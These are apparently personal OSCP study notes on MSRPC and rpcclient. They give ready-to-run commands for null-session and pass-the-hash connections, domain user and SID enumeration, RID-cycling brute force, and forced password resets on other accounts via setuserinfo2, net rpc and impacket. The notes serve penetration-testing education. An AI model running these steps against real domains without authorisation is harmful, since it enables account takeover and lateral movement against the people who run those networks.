# 🧠 MSRPC / rpcclient — OSCP Notes
#tags: #rpc #msrpc #rpcclient #enum #windows #ad #oscp

## What It Is

**MSRPC = Microsoft's remote procedure call interface**, exposed on Windows/AD.
`rpcclient` (Samba) talks to it to **enumerate users, groups, SIDs, the password policy**, and — with the right rights — **reset another user's password**.

Ports: **135/tcp** (endpoint mapper), **593/tcp** (RPC over HTTP), and RPC also rides **445/tcp** (SMB named pipes → what `rpcclient` uses).

**Main question:** *"With this account, what can I read out of the directory over RPC, and can I change anyone's password?"*

---

## When to Use

- Nmap shows **135 / 593** (msrpc, ncacn_http) — almost always on a DC
- You have creds but `psexec`/`wmiexec`/`smbexec`/WinRM don't give a shell → RPC is still open for enum
- You want to enumerate users/groups without LDAP creds (null session sometimes works)
- BloodHound flagged **ForceChangePassword / GenericAll** over a user → reset their password here

---

## RPC vs BloodHound — which first?

**Trigger for BloodHound = getting any valid creds** (not "having RPC open").
BloodHound is the **map** (computes *who can do what to whom* — ACLs, group nesting, paths).
RPC/rpcclient is an **interaction/execution** tool you drive *because* of what the map shows.

- rpcclient enum (`enumdomusers`, `queryuser`) shows **users/groups** — but NOT the ACL edges
  (it won't tell you "support can reset audit2020"). Only BloodHound surfaces that.
- So the order is: **creds → BloodHound (find the edge) → rpcclient (execute the edge)**.
  Reaching for `setuserinfo2` before BloodHound = guessing which user to target.
- Tie-in: `bloodhound-python` collects over **LDAP + SMB/RPC named pipes** — same plumbing.
  BloodHound *reads* the domain through RPC; rpcclient lets you *act* through it.

```bash
# once you have creds, collect for BloodHound FIRST:
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All
```

See [[BloodHound]].

---

## Connect

```bash
rpcclient -U '' -N <ip>                         # → null session (no creds)
rpcclient -U '<user>%<password>' <ip>     # → authed (user%pass)
rpcclient -U 'DOMAIN/<user>%<pass>' <ip>            # → with domain
rpcclient -U 'user' --pw-nt-hash <ip>           # → pass-the-hash (prompt for NT hash)
```
Once connected you get an `rpcclient $>` prompt — run the commands below there,
or one-shot with `-c`: `rpcclient -U '...' <ip> -c 'enumdomusers'`

---

## Enumerate

```
enumdomusers          # → all domain users (RID + username)
enumdomgroups         # → domain groups
querydispinfo         # → users + descriptions (creds sometimes in description)
queryuser <RID>       # → full detail on one user (last logon, flags, etc.)
queryusergroups <RID> # → groups a user belongs to
enumdomains           # → domains on this host
querydominfo          # → domain info (user count, server role)
getdompwinfo          # → password policy (min length, complexity, lockout)
netshareenumall       # → list shares (like smbclient -L)
```

**SID ↔ name lookups:**
```
lsaquery              # → domain SID
lookupnames <name>    # → name  → SID/RID
lookupsids <SID>      # → SID   → name
enumalsgroups builtin # → builtin local groups (e.g. Administrators members)
enumalsgroups domain  # → domain local groups
```

---

## RID Cycling (when enumdomusers is denied but null lsa works)

If `enumdomusers` fails but `lookupsids` answers on a null session, brute the RIDs:
```bash
# get domain SID first (lsaquery), then:
for i in $(seq 500 1100); do \
  rpcclient -U '' -N <ip> -c "lookupsids <DOMAIN-SID>-$i"; done | grep -v 'NONE'
# easier: impacket does this for you
impacket-lookupsid <ip>/<user>:<pass>@<ip>          # → dumps users via RID cycling
netexec smb <ip> -u <user> -p <pass> --rid-brute    # → same, via netexec
```
> RIDs: 500 = Administrator, 501 = Guest, users start ~1000.

---

## Reset Another User's Password (ForceChangePassword / GenericAll)

If you have **ForceChangePassword** or **GenericAll** over a target user (confirm in BloodHound),
change their password without knowing the old one:

```
# inside rpcclient (as the privileged account):
setuserinfo2 <targetuser> 23 '<NewPassword123!>'
```
`23` = the info level for NT password. Silent success = password changed.

**Samba alternative (no rpcclient prompt):**
```bash
net rpc password "<targetuser>" "<NewPassword123!>" \
  -U "DOMAIN/<youruser>%<yourpass>" -S <dc-ip>
```

**Impacket alternative:**
```bash
impacket-changepasswd 'DOMAIN/target@<dc-ip>' \
  -newpass 'NewPassword123!' -altuser 'DOMAIN/youruser' -altpass 'yourpass' -reset
```

After the reset → re-run share enum / evil-winrm / secretsdump as the target user.

---

## Quick Reference

| Goal | Command |
|---|---|
| Null session | `rpcclient -U '' -N <ip>` |
| Authed session | `rpcclient -U 'user%pass' <ip>` |
| List users | `enumdomusers` |
| List groups | `enumdomgroups` |
| User detail | `queryuser <RID>` |
| Password policy | `getdompwinfo` |
| Domain SID | `lsaquery` |
| RID brute (denied enum) | `impacket-lookupsid <ip>/<u>:<p>@<ip>` |
| Force-change a password | `setuserinfo2 <user> 23 '<newpass>'` |

Related: [[SMB]] · [[LDAP]] · [[BloodHound]]
